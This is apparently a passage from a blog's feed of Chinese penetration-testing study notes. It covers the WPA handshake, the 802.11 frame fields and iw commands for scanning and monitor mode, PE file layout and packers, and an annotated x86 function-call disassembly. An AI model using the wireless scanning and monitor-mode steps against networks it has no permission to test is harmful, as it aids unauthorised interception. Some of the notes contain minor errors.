title="四步握手生成PTK"></a>四步握手生成PTK</h4></li></ul><ul><li>AP发送Anonce给STA</li><li>STA生成Snonce计算出PTK</li><li>STA发送Snonce加PTK的MIC给AP</li><li>AP拿到Snonce计算出PTk</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK</li><li>AP发GTK给STA</li><li>STA回复ACk并使用密钥加密</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>集中身份验证：<ul><li>Radius</li><li>LADP</li><li>kerberos</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>802.11协议栈帧结构</title>
      <link href="/posts/82f31d55.html"/>
      <url>/posts/82f31d55.html</url>
      
        <content type="html"><![CDATA[<h2 id="802-11协议栈帧结构"><a href="#802-11协议栈帧结构" class="headerlink" title="802.11协议栈帧结构"></a>802.11协议栈帧结构</h2><ul><li>首先选择合适的无线网卡</li><li>了解基本操作</li><li>学习协议栈帧结构</li><li>实际抓包查看</li></ul><a id="more"></a><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h4><ul><li><p><code>iw list</code> 查看无线网卡的配置信息</p></li><li><p><code>iwlist wlan0 frequency</code>查看支持的频段</p></li></ul><h4 id="扫描附近AP"><a href="#扫描附近AP" class="headerlink" title="扫描附近AP"></a>扫描附近AP</h4><ul><li><p><code>iw dev wlan0 scan</code></p></li><li><p><code>iw dev wlan0 scan|egrep &quot;DS\ Parameter\ set|SSID&quot;</code></p></li><li><p><code>iwlist wlan0 scannign|grep&quot;ESSID|Channel&quot;</code></p></li></ul><h4 id="添加删除侦听端口"><a href="#添加删除侦听端口" class="headerlink" title="添加删除侦听端口"></a>添加删除侦听端口</h4><ul><li><p><code>iw dev wlan0 interface add wlan0mon type monitor</code></p></li><li><p><code>iw dev wlan0mon interface del</code></p></li></ul><h3 id="RADIOTAP头"><a href="#RADIOTAP头" class="headerlink" title="RADIOTAP头"></a>RADIOTAP头</h3><ul><li>802.11帧发射和接收的事实标准，802.11依赖Radiotap完成通信过程</li><li>Linux系统在驱动和API中内建支持Radiotap</li><li>802.11帧发射之前，网卡驱动在802.11头前添加Radiotap头，反之当网卡接收无线帧时，驱动通知MAC层，此帧头包含Radiotap头</li><li>Radiotap为802.11帧传递额外信息，厂家可以自定义，因此头长度不固定</li></ul><h3 id="802-11帧结构"><a href="#802-11帧结构" class="headerlink" title="802.11帧结构"></a>802.11帧结构</h3><ul><li>DU（Data Unit）数据单元，信息传输的最小数据集合</li><li>SDU（Service Data Unit）/PDU（Protocol Data Unit）</li></ul><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><h4 id="帧控制"><a href="#帧控制" class="headerlink" title="帧控制"></a>帧控制</h4><ul><li>Protocol Version(2bit) :802.11协议版本，始终为0，1，2，3</li><li>Type(2bit):规定帧的具体用途（3种类型）：</li></ul><table><thead><tr><th>Type</th><th>Mean</th></tr></thead><tbody><tr><td>00</td><td>管理帧</td></tr><tr><td>01</td><td>控制帧</td></tr><tr><td>10</td><td>数据帧</td></tr><tr><td>11</td><td>保留</td></tr></tbody></table><ul><li>SubType（4bit）</li></ul><table><thead><tr><th>Subtype</th><th>Mean</th><th>Type</th></tr></thead><tbody><tr><td>0000</td><td>Association request（连接请求）</td><td>00</td></tr><tr><td>0001</td><td>Association response（连接应答）</td><td>00</td></tr><tr><td>0010</td><td>Reassociation request（重新连接请求）</td><td>00</td></tr><tr><td>0011</td><td>Reassociation response（重新连接应答）</td><td>00</td></tr><tr><td>0100</td><td>Probe request（探查请求）</td><td>00</td></tr><tr><td>0101</td><td>Probe response（探查应答）</td><td>00</td></tr><tr><td>1000</td><td>Beacon（导引信号）</td><td>00</td></tr><tr><td>1001</td><td>Announcement traffic indication message (ATIM)（数据代传指示通知信号）</td><td>00</td></tr><tr><td>1010</td><td>Disassociation（解除连接）</td><td>00</td></tr><tr><td>1011</td><td>Authentication（身份验证）</td><td>00</td></tr><tr><td>1100</td><td>Deauthentication（解除认证）</td><td>00</td></tr><tr><td><strong>Subtype</strong></td><td><strong>Mean</strong></td><td><strong>Type</strong></td></tr><tr><td></td><td>0000-0110 保留</td><td></td></tr><tr><td>0111</td><td>Control Wrapper</td><td></td></tr><tr><td>1000</td><td>Block Ack Request(BlockAckReq)</td><td></td></tr><tr><td>1001</td><td>Block Ack (BlockAck)</td><td></td></tr><tr><td>1010</td><td>PS-Poll</td><td></td></tr><tr><td>1011</td><td>RTS（请求发送）</td><td>01</td></tr><tr><td>1100</td><td>CTS（允许发送）</td><td>01</td></tr><tr><td>1101</td><td>ACK（应答）</td><td>01</td></tr><tr><td>1110</td><td>CF-End（免竞争期间结束）</td><td>01</td></tr><tr><td>1111</td><td>CF-End（免竞争期间结束）+CF-Ack（免竞争期间回应）</td><td>01</td></tr><tr><td><strong>Subtype</strong></td><td><strong>Mean</strong></td><td><strong>Type</strong></td></tr><tr><td>0000</td><td>Data（数据）</td><td>10</td></tr><tr><td>0001</td><td>Data+CF-Ack</td><td>10</td></tr><tr><td>0010</td><td>Data+CF-Poll</td><td>10</td></tr><tr><td>0011</td><td>Data+CF-Ack+CF-Poll</td><td>10</td></tr><tr><td>0100</td><td>Null data (无数据：未发送数据)</td><td>10</td></tr><tr><td>0101</td><td>CF-Ack (未发送数据)</td><td>10</td></tr><tr><td>0110</td><td>CF-Poll (未发送数据)</td><td>10</td></tr><tr><td>0111</td><td>Data＋CF-Ack+CF-Poll</td><td>10</td></tr><tr><td>1000</td><td>QoS Data</td><td>10</td></tr><tr><td>1001</td><td>QoS Data + CF-Ack</td><td>10</td></tr><tr><td>1010</td><td>QoS Data + CF-Poll</td><td>10</td></tr><tr><td>1011</td><td>QoS Data + CF-Ack + CF-Pol</td><td>10</td></tr><tr><td>1100</td><td>QoS Null (未发送数据)</td><td>10</td></tr><tr><td>1101</td><td>QoS CF-Ack (未发送数据)</td><td>10</td></tr><tr><td>1110</td><td>QoS CF-Poll (未发送数据)</td><td>10</td></tr><tr><td>1111</td><td>QoS CF-Ack+CF-Poll （未发送数据)</td><td>10</td></tr></tbody></table><ul><li><p>To DS/From DS(1/1 bit)</p><ul><li>0x00:出现在<a href="https://pyrrhax.com/2020/09/24/%E6%97%A0%E7%BA%BF%E7%BD%91%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" target="_blank" rel="noopener">IBSS</a>环境中（可能是Management帧或者是Control帧类型）；或者是STSL（Station to Station Link）中两个STA之间通信，这种情况下不通过AP</li><li>0x01:表示data从AP向STA传递</li><li>0x02:表示data从STA向AP传递</li><li>0x03:表示两个AP间通信，这是典型的WDS环境下AP间的通信；或者表示Mesh环境下MP间的通信，只有此时才会使用到Address4字段。</li></ul></li><li><p>More frag(1bit):表示是否还有后续帧</p><ul><li>值为1时表示有后续分段，可能是data或者management帧类型。只有单播接收地址的帧会被分段，广播的直接发送。</li></ul></li><li><p>retry（1bit）:重传</p><ul><li>值为1表示重传帧，可能是data或者management帧类型，接收端进程使用此值防止帧重复；</li></ul></li><li><p>PowerMgmt(1bit):活动模式(0)/省电模式(1)</p><ul><li>STA处于省电模式时，向关联的AP发送该值为1的帧（AP从不使用此字段），省电模式下STA不接受数据，发送给它的Data帧由AP暂时缓存。</li></ul></li><li><p>MoreData(1bit)</p><ul><li>当AP至少缓存了一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己，并向AP发送PS-Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播/多播帧需要发送的情况；</li></ul></li><li><p>Protected Frame(bit)</p><ul><li>可能是data或者management帧类型，表示MSDU是否被加密，也被用于表示psk身份验证Frame#3帧；数据载荷为空时，该字段值为0；</li></ul></li><li><p>Order(1bit)</p><ul><li>在非Qos帧的情况下，值为1表示数据必须严格按顺序处理，通常为0</li></ul></li></ul><h4 id="Duration-ID"><a href="#Duration-ID" class="headerlink" title="Duration/ID"></a>Duration/ID</h4><ul><li>所有Control帧都使用该字段，其作用随Type/SubType变化有所不同</li><li>帧类型为PS Poll(type:1,subtype:10)时，表示STA关联的AID(association identity,在sta连上ap时，由ap发送给sta);</li><li>其它情况下，该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于（Network Allocation Vector）计算，单位是微秒；</li></ul><h4 id="MAC-Layer-Address"><a href="#MAC-Layer-Address" class="headerlink" title="MAC Layer Address"></a>MAC Layer Address</h4><ul><li>Basic service set ID（BSSID）;它是BSS的2层唯一标识，Infrastructure模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID。</li></ul><h4 id="Sequence-Control（16bit）"><a href="#Sequence-Control（16bit）" class="headerlink" title="Sequence Control（16bit）"></a>Sequence Control（16bit）</h4><ul><li>这个字段包含两个子字段：Sequence Number和Fragment Number；</li><li>Sequence Number是每个帧的编号，数值范围是0-4095，当帧被分段时，同帧不同分段的sequenceNumber相同。</li><li>FragmentNumber是被分段的帧用于标识分段位置顺序的编号，数值范围是0-15，以1为步长递增。</li></ul><h4 id="Frame-Body-变长"><a href="#Frame-Body-变长" class="headerlink" title="Frame Body(变长)"></a>Frame Body(变长)</h4><ul><li>数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的上层头信息，和可被传递的 数据2048字节）。不同的加密方法会增加一定的内容长度。<ul><li>WEP：+8bytes-&gt;2312bytes</li><li>TKIP(WPA1):+20bytes-&gt;2324bytes</li><li>CCMP(WPA2):+16bytes-&gt;2320bytes</li></ul></li></ul><h4 id="FCS-32bit"><a href="#FCS-32bit" class="headerlink" title="FCS(32bit)"></a>FCS(32bit)</h4><ul><li>发送端对全部MAC包头和FrameBody内容进行CRC计算，计算结果即为FCS（FrameCheckSequence）值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广播/多播帧可能被接收）</li><li>注：wireshark抓包时已经删除了FCS值</li></ul><h3 id="控制帧实例"><a href="#控制帧实例" class="headerlink" title="控制帧实例"></a>控制帧实例</h3><h4 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a>ACK</h4><ul><li>接收端正确接收数据后向发送端返回ACK确认</li><li>每个单播帧需要立即确认<ul><li>组播和广播帧不需要确认、</li></ul></li><li>尽快响应<ul><li>由硬件完成，而非驱动层</li></ul></li><li>Type/Subtype:1/13</li></ul><h4 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a>PS-POLL</h4><ul><li>AID——Association ID</li><li>STA省电模式唤醒<ul><li>数据发送至AP（AP缓存数据包）</li><li>通过Beacon发送TIM（traffic indication map）<ul><li>其中包含AID</li></ul></li><li>STA对比AID后唤醒网卡</li><li>STA发送PS-Poll帧，请求从AP缓存中取回数据<ul><li>每个帧都需要ACK确认</li><li>ACK确认后AP从缓存中删除数据帧</li><li>传输过程中STA保持唤醒状态，传输结束后STA恢复省电状态</li></ul></li></ul></li><li>Type/Subtype:1/10</li></ul><h4 id="RTS-CTS"><a href="#RTS-CTS" class="headerlink" title="RTS/CTS"></a>RTS/CTS</h4><ul><li><p>RTS/CTS是CSMA/CA方法的一种补充手段</p></li><li><p>降低冲突产生的可能性</p></li><li><p>正式通信之前通过请求应答机制，确信通信介质的可用性</p></li><li><p>锁定传输介质，预约通信时间</p></li><li><p>只有在传输长帧时使用，传输短帧时不会使用</p><ul><li>驱动接口提供长帧阈值的自定义</li></ul></li><li><p>A —-RTS—-&gt;B</p><p>A&lt;—-CTS—-B</p><p>A—-Data—-&gt;B</p><p>A&lt;—-ACK—-B</p><p>A—-Data—-&gt;B</p><p>A&lt;—-ACK—-B</p><p>……</p></li></ul><h3 id="管理帧实例"><a href="#管理帧实例" class="headerlink" title="管理帧实例"></a>管理帧实例</h3><ul><li>管理帧用于协商和控制STA与AP之间的关系</li></ul><h4 id="Beacon-Frame"><a href="#Beacon-Frame" class="headerlink" title="Beacon Frame"></a>Beacon Frame</h4><ul><li>AP发送的广播帧，通告无线网络的存在（BSSID）</li><li>发包频率<ul><li>102.4ms（可变）</li><li>单位时间1024microsecond（）</li></ul></li><li>SSID网络名<ul><li>隐藏AP不发SSID广播</li></ul></li></ul><h4 id="Probe-Request-Frames"><a href="#Probe-Request-Frames" class="headerlink" title="Probe Request Frames"></a>Probe Request Frames</h4><ul><li>用于STA扫描现有AP<ul><li>发现连接过的AP</li><li>发现未连接的AP</li></ul></li></ul><h4 id="Probe-Response-Frames"><a href="#Probe-Response-Frames" class="headerlink" title="Probe Response Frames"></a>Probe Response Frames</h4><ul><li>发现连接过的AP时，速率和ESSID相同的AP会响应。</li></ul><h4 id="Authentication-Frames"><a href="#Authentication-Frames" class="headerlink" title="Authentication Frames"></a>Authentication Frames</h4><ul><li>Authentication Algorithm身份认证类型<ul><li>0：开放系统身份验证</li><li>1：共享密钥身份验证</li></ul></li><li>身份认证有多个帧交换过程组成</li><li>Authentication Seq<ul><li>每次身份验证过程Seq唯一</li><li>1-65535</li></ul></li><li>Challenge text<ul><li>只用共享密钥方式才有此字段</li></ul></li><li>Status Code：成功/失败</li></ul><h4 id="Association-Reassociation-Freames"><a href="#Association-Reassociation-Freames" class="headerlink" title="Association/Reassociation Freames"></a>Association/Reassociation Freames</h4><ul><li>身份验证后，STA执行关联操作，加入无线网络 </li></ul><h4 id="Disassociation-Deauthentication"><a href="#Disassociation-Deauthentication" class="headerlink" title="Disassociation/Deauthentication"></a>Disassociation/Deauthentication</h4><ul><li>由AP发出，2字节</li></ul><h4 id="ATIM-Frames"><a href="#ATIM-Frames" class="headerlink" title="ATIM Frames"></a>ATIM Frames</h4><ul><li>只在ad-hoc网络下使用<ul><li>STA使用此帧通知接收者其有缓存的数据要发送</li></ul></li></ul><h3 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><ul><li>传输用户数据<ul><li>DATA Frame</li></ul></li><li>空数据帧<ul><li>Null data frame</li><li>只包含MAC头和FCS</li><li>STA用空数据帧声明自己要进入省电模式</li></ul></li></ul><h3 id="连接到无线网络的过程"><a href="#连接到无线网络的过程" class="headerlink" title="连接到无线网络的过程"></a>连接到无线网络的过程</h3><ul><li>Probe<ul><li>STA向所有信道发出probe帧，发现AP</li><li>AP应答Response</li></ul></li><li>Authentication<ul><li>STA向AP发出验证请求</li><li>发生认证过程</li><li>AP响应STA认证结果</li></ul></li><li>Association<ul><li>STA发出关联请求</li><li>AP响应</li><li>开始通信</li></ul></li></ul><h4 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h4><ul><li>STA发认证请求</li><li>AP返回随机Challenge消息</li><li>STA使用PSK加密Cha并发回给AP</li><li>AP使用PSK解密，获得Cha并与原始Cha对比，相同则验证成功，不同则失败。</li><li>大部分无线驱动首先尝试open验证，如果失败则尝试PSK</li><li>无论使用什么加密架构，关联过程完全相同<ul><li>STA向AP发送关联请求</li><li>AP向STA发送关联成功或者失败结果</li></ul></li><li>隐藏AP<ul><li>STA关联包中必须包含目标AP的ESSID</li><li>嗅探到此关联包，说明有隐藏AP存在</li></ul></li></ul><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><ul><li>无线安全根源<ul><li>802.11基于无线电波发射信息</li><li>嗅探侦听是主要问题</li><li>加密机制是必须的手段</li></ul></li><li>Wired Equivalent Privacy(WEP)<ul><li>802.11标准的一部分</li><li>发布不久后被发现存在安全漏洞</li></ul></li><li>WiFi Protected Access（WPA）取代WEP<ul><li>WPA2（802.11i标准）</li></ul></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li>协议栈：<a href="https://www.kernel.org/doc/htmldocs/80211/index.html" target="_blank" rel="noopener">https://www.kernel.org/doc/htmldocs/80211/index.html</a></li><li>无线驱动：<a href="https://wireless.wiki.kernel.org/" target="_blank" rel="noopener">https://wireless.wiki.kernel.org/</a></li><li>《802.11权威书》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟内存与程序调试</title>
      <link href="/posts/b05e9c0a.html"/>
      <url>/posts/b05e9c0a.html</url>
      
        <content type="html"><![CDATA[<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><ul><li>Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中物理内存非常复杂，需要静茹Windows内核级别ring0才能看到。通常，在用户模式下，用调试器看到的内存地址都是虚拟内存。</li><li>程序进行虚地址（逻辑地址）到实地址（物理地址）转换的过程称为程序的再定位。</li></ul><a id="more"></a><p>几个重要概念：</p><ul><li>文件偏移地址（File Offset）：数据在PE文件中的地址，相对于文件开头的偏移地址。</li><li>装载基址（Image Base）: PE装入内存时的基地址<ul><li>默认情况下，exe文件在内存中的基地址是0x00400000，dll文件是0x10000000。可以通过修改编译选项修改。</li></ul></li><li>虚拟内存地址（Virtual Address）：PE文件中的指令被装入内存后的地址</li><li>相对虚拟地址(Relative Virtual Address,RVA)：内存地址相对于装载基址的偏移量</li></ul><h3 id="PE文件和内存中的差异"><a href="#PE文件和内存中的差异" class="headerlink" title="PE文件和内存中的差异"></a>PE文件和内存中的差异</h3><ul><li>PE文件中的数据按照磁盘数据标准存放，以0x200字节为基本单位进行组织。</li><li>内存是0x1000字节</li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul><li>lordPE</li><li>OllyDbg，适合动态调试</li><li>IDA（Interactive Disassembler）适合静态调试</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件与加壳</title>
      <link href="/posts/bf686e21.html"/>
      <url>/posts/bf686e21.html</url>
      
        <content type="html"><![CDATA[<h2 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h2><ul><li>PE（Portable Executable）是Windows下可执行文件遵守的数据格式，如*.exe,*.dll</li><li>除了二进制机器码，还包含了字符串，菜单，图标，位图，字体等。</li><li>在程序被执行时，操作系统会按照PE文件格式的约定去相应的地方准确地定位各种类型的资源，并分别装入不同的区域。</li></ul><a id="more"></a><ul><li>PE文件格式把可执行文件分成若干个数据节（section）<ul><li>rsrc 存放程序资源，如图标，菜单等</li><li>idata可执行文件所使用的动态链接库等外来函数与文件的信息</li><li>text由编译器产生，粗放这二进制的机器代码，也是我们反汇编和调试的对象</li><li>初始化的数据快，如宏定义，全局变量，静态变量等</li></ul></li><li>如果是正常编译出的标准PE文件，其节信息往往是大致相同的，但这些section的名只是为了方便人的记忆与使用，使用Microsoft VisualC++中的编译指示符：#pragma_data_seg()可以把内容编译到任意的节中，节名也是自定义的。</li></ul><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><ul><li><p>全称：可执行 程序资源压缩，是保护文件的常用手段。</p></li><li><p>加壳后，PE的节信息就会变得非常古怪，在Crack和反病毒分析中需要经常处理这类古怪的PE文件。</p></li><li><p>加壳过的程序可以直接运行，但是不能查看源代码，需要经过脱壳才可以查看。</p></li><li><p>加壳类似于压缩，解压程序附加在原程序上，通过Windos加载器载入内存后，先于原程序执行，得到控制权，执行过程之中对原程序进行解密、还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分。</p></li><li><p>加壳后，原始程序代码在磁盘文件中是以加密之后的形式存在的，只是在执行时还原，这样就可以比较有效的防止对程序文件的非法修改和静态反编译。</p></li><li><p>加壳工具分为两种：</p><ul><li>压缩壳：减小软件体积，加密保护不是重点。</li><li>加密壳种类比较多，不同的壳侧重点不同，一些壳单纯保护程序，另一些壳提供额外的功能，如提供注册机智，使用次数，时间限制等。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用及渗透测试基础学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编-一个函数调用的例子</title>
      <link href="/posts/e3e69c16.html"/>
      <url>/posts/e3e69c16.html</url>
      
        <content type="html"><![CDATA[<h2 id="汇编-寄存器及主要指令"><a href="#汇编-寄存器及主要指令" class="headerlink" title="汇编-寄存器及主要指令"></a>汇编-寄存器及主要指令</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>可以分为四类：</p><ul><li><p>数据寄存器</p><ul><li><p>EAX（Accumulator）</p><ul><li>可用于乘除，输入输出等操作，他们的使用频率很高。EAX还通常用于存储函数的返回值。</li></ul></li><li><p>EBX（Base Register） </p><ul><li>作为存储器指针来使用，用来访问存储器。</li></ul></li><li><p>ECX (Count Register)</p><ul><li>在循环和字符串操作时，用来控制循环次数；在移多位时，要用CL来指明移位的位数。</li></ul></li><li><p>EDX (Data Register)</p><ul><li>在进行乘除运算时，作为默认操作数参与运算，也可用于存放I/O的端口地址。</li></ul></li></ul><a id="more"></a></li><li><p>地址寄存器：</p><ul><li>变址（ESI，EDI）<ul><li>分别作为“原地址指针”和“目的地址指针”</li></ul></li><li>指针（ESP,EBP）<ul><li>栈帧顶，栈帧底</li></ul></li></ul></li><li><p>段寄存器：ES CS SS DS FS GS</p><ul><li>内存单元的物理地址，由段寄存器的值和一个偏移量组合，组成一个大的内存地址。</li><li>CS:代码段</li><li>DS：数据段</li><li>ES：附加段</li><li>SS：堆栈段</li><li>FS：附加段</li><li>GS 附加段</li><li>融合变址寄存器，在很多字符串操作指令中，DS:ESI指向源串，ES:EDI指向目标串。</li></ul></li><li><p>指令寄存器  EIP（下一步执行的代码）; 标志寄存器 EFlags</p></li></ul><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><ul><li>数据传送指令：<ul><li>MOV  目的操作数，源操作数</li><li>XCHG 寄存器A ，寄存器B 交换</li><li>PUSH 寄存器，POP 寄存器 把寄存器的操作数压入堆栈或从堆栈取出到寄存器</li><li>PUSHF,POPF （标志寄存器出入栈）</li><li>PUSHA,POPA 这两个指令的作用是把通用寄存器压栈出栈。寄存器的入栈顺序依次是：EAX,ECX,EDX,EBX,ESP(初始值)，EBP,ESI,EDI.出栈相反。</li><li>LEA,LDS,LES 取地址到寄存器</li></ul></li><li>位运算指令：<ul><li>ADN,OR,XOR,NOT,TEST</li><li>SHR,SHL,SAR,,SAL  算数移动和逻辑移动</li><li>ROR,ROL,RCR,RCL 循环位移</li></ul></li><li>算数运算指令：<ul><li>ADD ADC 加法</li><li>SUB SBB 减</li><li>INC EDC 自增 自减</li><li>NEG 自反</li><li>MUL IMUL 乘</li><li>DIV IDIV 除</li></ul></li><li>流程控制指令<ul><li>CMP 比较op1与op2的值</li><li>JMP 跳转指定地址</li><li>LOOP 循环指令</li><li>CALL RET 子程序点用，返回</li><li>INT IRET中断调用及返回</li><li>REP REPE REPNE 重复前缀指令</li></ul></li><li>条件转移命令<ul><li>JXX：当特定条件成立则跳往指定地址<ul><li>Z为0</li><li>G大于</li><li>L小于</li><li>E等于</li><li>N相反</li></ul></li></ul></li><li>字符串操作指令集<ul><li>MOVSB MOVSW MOVSD字符串传送指令(B字节，W字，D双字)</li><li>CMPSB CMPSW CMPSD 字符串比较指令</li><li>SCASB,SCASW字符串搜索指令</li><li>LODSB,LODSW,STOSB,STOSW字符串载入或驻存指令</li></ul></li></ul><h2 id="一个程序调用的例子"><a href="#一个程序调用的例子" class="headerlink" title="一个程序调用的例子"></a>一个程序调用的例子</h2><h3 id="C语言程序"><a href="#C语言程序" class="headerlink" title="C语言程序"></a>C语言程序</h3><figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x,<span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> z=<span class="hljs-number">0</span>;<br>    z=x+y;<br>    <span class="hljs-keyword">return</span> z;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> n=<span class="hljs-number">0</span>;<br>    n=add(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>,n);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>一个例子：</p><ul><li>main</li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">void main()<br>***********<br>int n&#x3D;0;<br>0041140E mov dword ptr[n],0<br>n&#x3D;add(1,3);<br>00411415 push 3&#x2F;&#x2F;<br>00411417 push 1&#x2F;&#x2F; 参数入栈后ESP抬高（值变小，往低地址拓展）<br>00411419 call add(411096h)&#x2F;&#x2F;EIP入栈，ESP抬高，跳转到函数入口地址<br>0041141E add  esp,8&#x2F;&#x2F;add完之后恢复栈帧<br>00411421 mov  dword ptr[n],eax  &#x2F;&#x2F;函数返回的结果存储在eax中，此时把结果赋值给n<br>printf(&quot;%d\n,n&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>add(int x,int y)</li></ul><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">int add(int x,int y)<br>&#123;<br>********栈空间分配******<br>004113A0 push ebp&#x2F;&#x2F;将主函数栈底EBP入栈，ESP抬高（将原来的栈底入栈，准备指向新的栈底）<br>004113A1 mov ebp,esp&#x2F;&#x2F;将ebp和esp都指向栈顶，目前栈里是空的，esp&#x3D;ebp<br>004113A3 sub esp,0CCH&#x2F;&#x2F;0CCH由编译器确定，esp向上抬高CCH，栈成型<br>********初始化*********<br>004113A9 push ebx&#x2F;&#x2F;用于保存现场， ebx作为内存偏移指针使用,esp抬高<br>004113AA push esi&#x2F;&#x2F;用于保存现场， esi是源地址寄存器,esp抬高<br>004113AB push edi&#x2F;&#x2F;用于保存现场， edi是目的指针寄存器,esp抬高<br>004113AC lea edi,[ebp-0CCH]&#x2F;&#x2F;将当前栈顶地址装入EDI<br>004113B2 mov ecx,33h&#x2F;&#x2F;设置计数器数值<br>004113B7 mov eax,0CCCCCCCCh<br>004113BC rep stos dword ptr es:[edi]&#x2F;&#x2F;循环，将栈区的数据都初始化为CCH，每次将edi+1<br>********执行函数体******<br>int z&#x3D;0<br>004113BE mov dword ptr[z],0 &#x2F;&#x2F;将z初始化为0<br>004113C5 mov eax,dowrd ptr[x]&#x2F;&#x2F;将x赋值给eax<br>004113C8 add eax,dword ptr[y]&#x2F;&#x2F;将寄存器eax的值加y<br>004113CB mov dword ptr[z],eax&#x2F;&#x2F;将eax的值赋值给z<br>004113CE mov eax,dword ptr[z]&#x2F;&#x2F;将z的值放到eax <br>********恢复到主函数*******<br>004113D1 pop edi;&#x2F;&#x2F;恢复寄存器值<br>004113D2 pop esi;&#x2F;&#x2F;恢复寄存器值<br>004113D3 pop ebx;&#x2F;&#x2F;恢复寄存器值<br>004113D4 mov esp,ebp;&#x2F;&#x2F;栈顶指向之前的栈底，上面的栈帧不要了<br>004113D6 pop ebp;&#x2F;&#x2F;恢复寄存器值<br>004113D7 ret;&#x2F;&#x2F;根据返回地址，恢复EIP值，相当于popEIP<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用及渗透测试基础学习笔记 </tag>
            
        </tags>
      
